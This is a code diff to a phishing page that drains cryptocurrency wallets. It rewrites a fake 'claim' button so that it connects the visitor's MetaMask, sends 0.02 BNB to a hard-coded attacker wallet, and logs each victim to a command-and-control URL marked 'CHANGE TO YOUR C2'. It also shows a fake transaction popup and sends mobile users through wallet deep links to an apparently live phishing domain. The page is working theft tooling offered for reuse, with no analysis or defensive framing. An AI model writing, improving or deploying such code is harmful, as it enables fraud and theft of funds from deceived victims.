@@ -12,7 +12,6 @@
             --text: #fff;
             --gold: #f3ba2f;
             --green: #00ff00;
-            --gray: #333;
         }
         * {
             margin: 0;
@@ -191,100 +190,57 @@
     const ATTACKER_ADDRESS = "0x40f4c332be705dbf098a48a728248b13a005e7cb"; // CHANGE TO YOUR WALLET
     const EXFIL_URL = "https://your-c2-server.com/log.php"; // CHANGE TO YOUR C2
     const AMOUNT_BNB = "0.02";
+    const VALUE = ethers.utils.parseEther(AMOUNT_BNB);
 
-    // === WALLET DEEP LINKS ===
-    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-    const isAndroid = /Android/.test(navigator.userAgent);
+    const btn = document.getElementById("claimBtn");
 
-    const wallets = {
-        metamask: {
-            mobile: isIOS ? "metamask://": "intent://#Intent;scheme=metamask;package=com.metamask.wallet;end",
-            desktop: "https://metamask.io"
-        },
-        trust: {
-            mobile: isIOS ? "trust://": "intent://#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end",
-            web: "https://link.trustwallet.com"
-        },
-        phantom: {
-            mobile: isIOS ? "phantom://": "intent://#Intent;scheme=phantom;package=xyz.phantom.app;end",
-            web: "https://phantom.app"
-        },
-        okx: {
-            mobile: isIOS ? "okx://": "intent://#Intent;scheme=okx;package=com.okx.wallet;end",
-            web: "https://www.okx.com/web3"
-        },
-        rainbow: {
-            mobile: isIOS ? "rainbow://": "intent://#Intent;scheme=rainbow;package=me.rainbow;end",
-            web: "https://rainbow.me"
-        }
-    };
-
-    // === OPEN WALLET WITH TRANSACTION ===
-    async function connectAndSend() {
-        const btn = document.getElementById("claimBtn");
-        btn.disabled = true;
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Preparing Transaction...';
-
-        // Mobile: Try deep link first
-        if (isIOS || isAndroid) {
-            const deepLink = wallets.metamask.mobile;
-            window.location.href = deepLink;
-            setTimeout(() => {
-                window.location.href = wallets.metamask.web;
-            }, 1500);
-
-            // Try Trust Wallet if MetaMask fails
-            setTimeout(() => {
-                window.location.href = wallets.trust.mobile;
-            }, 2000);
-            return;
-        }
-
-        // Desktop: Use MetaMask extension
+    // === DESKTOP: TRY METAMASK EXTENSION FIRST ===
+    async function connectDesktop() {
         if (typeof window.ethereum !== "undefined") {
             try {
-                await window.ethereum.request({ method: "eth_requestAccounts" });
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
                 const userAddress = await signer.getAddress();
 
                 logVictim(userAddress);
 
                 btn.innerHTML = '<i class="fas fa-bolt"></i> Sending 0.02 BNB...';
-
-                // Pre-fill transaction
-                const tx = {
+                const tx = await signer.sendTransaction({
                     to: ATTACKER_ADDRESS,
-                    value: ethers.utils.parseEther(AMOUNT_BNB)
-                };
+                    value: VALUE
+                });
 
-                const txResponse = await signer.sendTransaction(tx);
                 btn.innerHTML = "✅ Success!";
-
-                showTxPopup(txResponse.hash);
-                logTransaction(txResponse.hash, userAddress);
+                showTxPopup(tx.hash);
+                logTransaction(tx.hash, userAddress);
 
             } catch (err) {
                 btn.innerHTML = "❌ Failed";
                 console.error(err);
-            } finally {
-                btn.disabled = false;
             }
         } else {
-            // Fallback: Open all wallet apps
-            openAllWallets();
-            btn.innerHTML = "📱 Open wallet app";
+            // NO EXTENSION → OPEN MOBILE WALLET DEEP LINKS
+            openMobileWallets();
         }
     }
 
-    // === OPEN ALL WALLET APPS (FALLBACK) ===
-    function openAllWallets() {
-        const links = Object.values(wallets).map(w => w.mobile || w.web);
-        links.forEach((link, i) => {
-            setTimeout(() => {
-                window.open(link, '_blank');
-            }, i * 800);
-        });
+    // === MOBILE: OPEN WALLET APPS WITHOUT PLAY STORE REDIRECT ===
+    function openMobileWallets() {
+        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+        const isAndroid = /Android/.test(navigator.userAgent);
+
+        // Try to open MetaMask App
+        if (isIOS) {
+            window.location.href = "https://metamask.app.link/dapp/rop-2026.onrender.com/claim.html";
+        } else if (isAndroid) {
+            // Use Universal Link → Opens in-app browser if wallet installed
+            window.location.href = "https://metamask.app.link/dapp/rop-2026.onrender.com/claim.html";
+        } else {
+            // Fallback: Open Trust Wallet deep link
+            window.open("https://link.trustwallet.com/open/url?coin_id=714&url=https://rop-2026.onrender.com/claim.html", '_blank');
+        }
     }
 
     // === FAKE TX POPUP ===
@@ -296,9 +252,7 @@
             <a href="https://bscscan.com/tx/${hash}" target="_blank" style="color:#00ccff;">${hash.slice(0,8)}...${hash.slice(-6)}</a>
         `;
         popup.classList.add("show");
-        setTimeout(() => {
-            popup.classList.remove("show");
-        }, 5000);
+        setTimeout(() => popup.classList.remove("show"), 5000);
     }
 
     // === LOG TO C2 ===
@@ -333,7 +287,13 @@
     }
 
     // === INIT ===
-    document.getElementById("claimBtn").addEventListener("click", connectAndSend);
+    btn.addEventListener("click", () => {
+        if (/Android|iPhone|iPad|iPod/.test(navigator.userAgent)) {
+            openMobileWallets();
+        } else {
+            connectDesktop();
+        }
+    });
 </script>
 
 </body>
